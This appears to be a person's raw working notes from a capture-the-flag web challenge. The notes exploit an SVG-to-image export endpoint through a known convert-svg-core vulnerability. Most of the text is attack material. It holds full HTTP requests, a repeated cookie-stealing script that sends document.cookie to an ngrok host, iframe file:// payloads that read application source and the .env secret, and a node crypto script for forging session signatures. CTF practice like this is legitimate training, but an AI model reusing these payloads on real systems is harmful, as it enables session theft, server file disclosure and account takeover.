
**Registered a user and logged in\. Got a couple cookies:
**
GET /dashboard HTTP/1\.1
Host: 165\.227\.224\.55:30683
User\-Agent: Mozilla/5\.0 \(Windows NT 10\.0; rv:91\.0\) Gecko/20100101 Firefox/91\.0
Accept: text/html,application/xhtml\+xml,application/xml;q=0\.9,image/webp,\*/\*;q=0\.8
Accept\-Language: en\-US,en;q=0\.5
Accept\-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: [http://165.227.224.55:30683/](#http://165.227.224.55:30683/)

Cookie: session=eyJ1c2VybmFtZSI6IjEyMy0xMjM0LTEyMzQifQ==; session\.sig=Z0Rpn9iKu\_FbK\_93fp0TiR\-hpRI
Upgrade\-Insecure\-Requests: 1


──╼ $echo "eyJ1c2VybmFtZSI6IjEyMy0xMjM0LTEyMzQifQ==" | base64 \-d
\{"username":"123\-1234\-1234"\}

[https://b0f8-216-93-199-231.ngrok.io/hi.html](#https://b0f8-216-93-199-231.ngrok.io/hi.html)



**Tried putting my cookie stealer in the SVG using JS and ngrok:
**
POST /api/export HTTP/1\.1
Host: 165\.227\.224\.55:30683
User\-Agent: Mozilla/5\.0 \(Windows NT 10\.0; rv:91\.0\) Gecko/20100101 Firefox/91\.0
Accept: \*/\*
Accept\-Language: en\-US,en;q=0\.5
Accept\-Encoding: gzip, deflate
Referer: [http://165.227.224.55:30683/dashboard](#http://165.227.224.55:30683/dashboard)

Content\-Type: application/json
Origin: [http://165.227.224.55:30683](#http://165.227.224.55:30683)

Content\-Length: 12619
DNT: 1
Connection: close
Cookie: session=eyJ1c2VybmFtZSI6IjEyMy0xMjM0LTEyMzQifQ==; session\.sig=Z0Rpn9iKu\_FbK\_93fp0TiR\-hpRI

\{"svg":"\<svg version=\\"1\.1\\" xmlns=\\"[http://www.w3.org/2000/svg\\"](#http://www.w3.org/2000/svg")
xmlns:xlink=\\"[http://www.w3.org/1999/xlink\\"](#http://www.w3.org/1999/xlink")
width=\\"500\\" height=\\"400\\" viewBox=\\"0,0,500,400\\"\>\<g fill=\\"#e74c3c\\" fill\-rule=\\"nonzero\\" stroke=\\"none\\" stroke\-width=\\"1\\" stroke\-linecap=\\"butt\\" stroke\-linejoin=\\"miter\\" stroke\-miterlimit=\\"10\\" stroke\-dasharray=\\"\\" stroke\-dashoffset=\\"0\\" font\-family=\\"none\\" font\-weight=\\"none\\" font\-size=\\"none\\" text\-anchor=\\"none\\" style=\\"mix\-blend\-mode: normal\\"\>\<script\>document\.location=' [https://1dd3-216-93-199-231.ngrok.io](#https://1dd3-216-93-199-231.ngrok.io)
[/?c='+document.cookie;</script><path](#https://b0f8-216-93-199-231.ngrok.io/?c='+document.cookie;</script><path)
d=\\"M54\.86487,353\.22505c1\.7129,\-6\.88669 1\.7129,\-6\.88669 \-16\.11983,\-48\.16616c\-17\.83274,\-41\.27947 \-17\.83274,\-41\.27947 \-17\.83274,14\.09565c0,55\.37512 0,55\.37512 16\.11983,48\.16616c16\.11983,\-7\.20896 16\.11983,\-7\.20896 17\.83274,\-14\.09565z\\"/\>\<path d=\\"M109\.12979,66\.79172c27\.87353,\-44\.61204 27\.87353,\-44\.61204 \-29\.25196,\-44\.61204c\-57\.12548,0 \-57\.12548,0 \-57\.12548,28\.04606c0,28\.04606 0,28\.04606 29\.25196,44\.61204c29\.25196,16\.56597 29\.25196,16\.56597 57\.12548,\-28\.04606z\\"/\>\<path 
\[\.\.\.\]
\-10\.20677,7\.12271 \-6\.0518,13\.47842c4\.15497,6\.35571 4\.15497,6\.35571 69\.80279,6\.35571z\\"/\>\</g\>\</svg\>"\}

\<iframe src="[https://1dd3-216-93-199-231.ngrok.io](#https://1dd3-216-93-199-231.ngrok.io)
/?c="\>\</iframe\>

\<script\>document\.location='[https://1dd3-216-93-199-231.ngrok.io](#https://1dd3-216-93-199-231.ngrok.io)
[/?c='+document.cookie;</script>](#https://b0f8-216-93-199-231.ngrok.io/?c='+document.cookie;</script><path)


[https://1dd3-216-93-199-231.ngrok.io](#https://1dd3-216-93-199-231.ngrok.io)


POC code here found for SVG library vuln:  [https://security.snyk.io/vuln/SNYK-JS-CONVERTSVGCORE-1582785](#https://security.snyk.io/vuln/SNYK-JS-CONVERTSVGCORE-1582785)

m3talm3rg3\-pablo came up with it \- from m4lmex

**He was using the include to try to find the file
Maybe we can exfiltrate other data w/ ngrok though?**

**Added this to top of req:**
\<svg\-dummy\>\</svg\-dummy\>\<script\>document\.location='[https://3e1b-216-93-199-231.ngrok.io](#https://3e1b-216-93-199-231.ngrok.io)
/?c='\+document\.cookie;\<script\>

DIdn't work\. But this did:
POST /api/export HTTP/1\.1
Host: 138\.68\.150\.120:31338
User\-Agent: Mozilla/5\.0 \(Windows NT 10\.0; rv:91\.0\) Gecko/20100101 Firefox/91\.0
Accept: \*/\*
Accept\-Language: en\-US,en;q=0\.5
Accept\-Encoding: gzip, deflate
Referer: [http://138.68.150.120:31338/dashboard](#http://138.68.150.120:31338/dashboard)

Content\-Type: application/json
Origin: [http://138.68.150.120:31338](#http://138.68.150.120:31338)

Content\-Length: 595
DNT: 1
Connection: close
Cookie: session=eyJ1c2VybmFtZSI6IjExMS0xMTEtMTExMSJ9; session\.sig=Hx7l5IJEuIjS3RqYX9GCmqR32Fw

\{"svg":"\<svg\-dummy\>\</svg\-dummy\>\<iframe src=\\"file://\.\./\.\./\.\./app/flag\.txt\\" width=\\"100%\\" height=\\"2000px\\"\>\</iframe\>\<svg version=\\"1\.1\\" xmlns=\\"[http://www.w3.org/2000/svg\\"](#http://www.w3.org/2000/svg")
xmlns:xlink=\\"[http://www.w3.org/1999/xlink\\"](#http://www.w3.org/1999/xlink")
width=\\"500\\" height=\\"400\\" viewBox=\\"0,0,500,400\\"\>\<g fill=\\"#e74c3c\\" fill\-rule=\\"nonzero\\" stroke=\\"none\\" stroke\-width=\\"1\\" stroke\-linecap=\\"butt\\" stroke\-linejoin=\\"miter\\" stroke\-miterlimit=\\"10\\" stroke\-dasharray=\\"\\" stroke\-dashoffset=\\"0\\" font\-family=\\"none\\" font\-weight=\\"none\\" font\-size=\\"none\\" text\-anchor=\\"none\\" style=\\"mix\-blend\-mode: normal\\"\>\</svg\>"\}


**error shows possible path:**
SyntaxError: Unexpected token \&#39; in JSON at position 58\<br\> \&nbsp; \&nbsp;at JSON\.parse \(\&lt;anonymous\&gt;\)\<br\> \&nbsp; \&nbsp;at parse \(/app/node\_modules/body\-parser/lib/types/json\.js:89:19\)\<br\> \&nbsp; \&nbsp;at **/app/**node\_modules/body\-parser/lib/read\.js:128:18\<br\> \&nbsp; \&nbsp;at AsyncResource\.runInAsyncScope \(node:async\_hooks:199:9\)\<br\> \&nbsp; \&nbsp;at invokeCallback \(/app/node\_modules/raw\-body/index\.js:231:16\)\<br\> \&nbsp; \&nbsp;at done \(/app/node\_modules/raw\-body/index\.js:220:7\)\<br\> \&nbsp; \&nbsp;at IncomingMessage\.onEnd \(/app/node\_modules/raw\-body/index\.js:280:7\)\<br\> \&nbsp; \&nbsp;at IncomingMessage\.emit \(node:events:402:35\)\<br\> \&nbsp; \&nbsp;at endReadableNT \(node:internal/streams/readable:1343:12\)\<br\> \&nbsp; \&nbsp;at processTicksAndRejections \(node:internal/process/task\_queues:83:21\)\</pre\>
\</body\>
\</html\>

Tried /app/flag\.txt /app/\.\./\.\./flag\.txt /app/\.\./\.\./\.\./flag\.txt /app/\.\./\.\./\.\./\.\./flag\.txt

\<script\>document\.location='[https://3e1b-216-93-199-231.ngrok.io/?c='+document.cookie;</script>](#https://3e1b-216-93-199-231.ngrok.io/?c='+document.cookie;</script>)



**Started trying to find other common node/express files in the path:
**POST /api/export HTTP/1\.1
Host: 138\.68\.150\.120:31338

\{"svg":"\<svg\-dummy\>\</svg\-dummy\>\<iframe src=\\"file:///app/routes/index\.js\\" width=\\"100%\\" height=\\"2000px\\"\>\<script\>document\.location='[https://3e1b-216-93-199-231.ngrok.io/doc.html';</script></iframe><svg](#https://3e1b-216-93-199-231.ngrok.io/doc.html';</script></iframe><svg)
version=\\"1\.1\\" xmlns=\\"[http://www.w3.org/2000/svg\\"](#http://www.w3.org/2000/svg")
xmlns:xlink=\\"[http://www.w3.org/1999/xlink\\"](#http://www.w3.org/1999/xlink")
width=\\"500\\" height=\\"400\\" viewBox=\\"0,0,500,400\\"\>\<g fill=\\"#e74c3c\\" fill\-rule=\\"nonzero\\" stroke=\\"none\\" str\-miter\\" stroke\-miterlimit=\\"10\\" stroke\-dasharray=\\"\\" stroke\-dashoffset=\\"0\\" font\-family=\\"none\\" font\-weight=\\"none\\" font\-size=\\"none\\" text\-anchor=\\"none\\" style=\\"mix\-blend\-mode: normal\\"\>\</svg\>"\}

![](./images/6c899d7aab8bf572e20c5eff8e4cd006.png)


\{"svg":"\<svg\-dummy\>\</svg\-dummy\>\<iframe src=\\"file:///app/database\.js\\" width=\\"100%\\" height=\\"2000px\\"\>\<script\>document\.location='[https://3e1b-216-93-199-231.ngrok.io/doc.html';</script></iframe><svg](#https://3e1b-216-93-199-231.ngrok.io/doc.html';</script></iframe><svg)
version=\\"1\.1\\" xmlns=\\"[http://www.w3.org/2000/svg\\"](#http://www.w3.org/2000/svg")
xmlns:xlink=\\"[http://www.w3.org/1999/xlink\\"](#http://www.w3.org/1999/xlink")
width=\\"500\\" height=\\"400\\" viewBox=\\"0,0,500,400\\"\>\<g fill=\\"#e74c3c\\" fill\-rule=\\"nonzero\\" stroke=\\"none\\" str\-miter\\" stroke\-miterlimit=\\"10\\" stroke\-dasharray=\\"\\" stroke\-dashoffset=\\"0\\" font\-family=\\"none\\" font\-weight=\\"none\\" font\-size=\\"none\\" text\-anchor=\\"none\\" style=\\"mix\-blend\-mode: normal\\"\>\</svg\>"\}

![](./images/72de527ffe879b3864ec3a0aa653e9b4.png)


**ooh, adminPwd is a const saved here\.\. maybe I can find it in the js? nah this is only used for migrate, sounds most likely impossible\.\.
Opened up /app/index\.js though and foudn:
**
![](./images/2c5f6c2e380384157297619a8c653b7d.png)


**/app/\.env  there it is\.\. if i have perms to read it, but I should as the user running the webapp\!\!**

![](./images/1ac941a0e5bc176e28989de9753ebbdf.png)


**Hmm, session\_secret\_key\.  Now, need to guess how I can use this\.\.
Lets see if its a flag first\.  Ran it into magic:

**5921719c3037662e94250307ec5ed1db**
**
**So, this should work to decrypt the signature and encrypt my own so I can login as admin\.  Only problem, I have no idea who the admin guid is\.\. unless I can find some clues in the top 20 lines of the code so it fits in this iframe\.  I might need to play with the iframe\.**

**Looked up more about**Express/node\.js session sig **to see if I can just attempt to encrypt my own sig and tell it I'm****admin**

**Here's prevention/mitigation technique for stealing cookies:**


##   

httpOnly

##  flag prevents the cookie from being accessed by client-side JavaScript.  



**Found some routines to encrypt with node crypto, hoping its aes256\-aem like this example:
**
GNU nano 5\.4                                                                              nodecrypto\.js                                                                                        
const crypto = require\('crypto'\);

const algorithm = 'aes\-256\-ctr';
#const secretKey = 'vOVH6sdmpNWjRRIqCc7rdxs01lwHzfr3';
const secretKey = '5921719c3037662e94250307ec5ed1db';
const iv = crypto\.randomBytes\(16\);

const encrypt = \(text\) =\> \{

const cipher = crypto\.createCipheriv\(algorithm, secretKey, iv\);

const encrypted = Buffer\.concat\(\[cipher\.update\(text\), cipher\.final\(\)\]\);

return \{
iv: iv\.toString\('hex'\),
content: encrypted\.toString\('hex'\)
\};
\};

const decrypt = \(hash\) =\> \{

const decipher = crypto\.createDecipheriv\(algorithm, secretKey, Buffer\.from\(hash\.iv, 'hex'\)\);

const decrpyted = Buffer\.concat\(\[decipher\.update\(Buffer\.from\(hash\.content, 'hex'\)\), decipher\.final\(\)\]\);

return decrpyted\.toString\(\);
\};

module\.exports = \{
encrypt,
decrypt
\};


└──╼ $node nodecrypto\.js
Hello World\!: \[object Object\]
\{"username":"111\-111\-1111"\} text : a6d509d81be45a0b33b7943a55a062864213b0844ba4f553a824b3
\{"username":"111\-111\-1111"\} IV : 859a115314c01c14bbac3a32eae2ab33
└──╼ $echo 859a115314c01c14bbac3a32eae2ab33 | base64
ODU5YTExNTMxNGMwMWMxNGJiYWMzYTMyZWFlMmFiMzMK

**nope**, but maybe I could go from raw bytes \(from hex\) to base64 instead in cyberchef:

My sig:
session=eyJ1c2VybmFtZSI6IjExMS0xMTEtMTExMSJ9; 
session\.sig=Hx7l5IJEuIjS3RqYX9GCmqR32Fw

hZoRUxTAHBS7rDoy6uKrMw==

**Hmmm\.\. not quite, no\.**
**Sig decodes frmo base64 as**: \.\.åä\.D¸\.ÒÝ\.\.\_Ñ\.\.¤wØ\\

Okay, I will come back to this, need the admin guid anyway to get a cookie as them, if that will actually help \(?? not sure\.\.\)

Got a better way to exfil the source to each site, the screen was too small, needed to modify this:

\{"svg":"\<svg\-dummy\>\</svg\-dummy\>\<iframe src=\\"[https://3e1b-216-93-199-231.ngrok.io/doc.html](#https://3e1b-216-93-199-231.ngrok.io/doc.html';</script></iframe><svg)
\\" allow=\\"fullscreen\\" width=\\"1500\\" height=\\"2400\\"\>\<script\>document\.location='[https://3e1b-216-93-199-231.ngrok.io/?c=';</script></iframe><svg](#https://3e1b-216-93-199-231.ngrok.io/doc.html';</script></iframe><svg)
version=\\"1\.1\\" xmlns=\\"[http://www.w3.org/2000/svg\\"](#http://www.w3.org/2000/svg")
xmlns:xlink=\\"[http://www.w3.org/1999/xlink\\"](#http://www.w3.org/1999/xlink")
width=\\"1500\\" height=\\"2400\\" viewBox=\\"0,0,1500,2400\\"\>\<g fill=\\"#3d3d3d\\" fill\-rule=\\"nonzero\\" stroke=\\"none\\" stroke\-miterlimit=\\"10\\" stroke\-dasharray=\\"\\" stroke\-dashoffset=\\"0\\" font\-family=\\"none\\" font\-weight=\\"none\\" font\-size=\\"8\\" text\-anchor=\\"none\\" style=\\"mix\-blend\-mode: normal\\"\>\</svg\>"\}

**routes shows it is taking this json:
**
svg: scope\.project \&\& scope\.project\.exportSVG\(\{asString: true\}\)

**Looks like I really just need to try signing with this key\!\!\!
The modules in use are:**
express\-session
cookie\-session
cookie\-parser

